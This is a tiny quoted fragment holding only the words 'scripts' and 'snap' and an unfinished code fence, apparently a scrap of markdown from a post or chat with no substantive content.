>scripts
>snap
>```
>
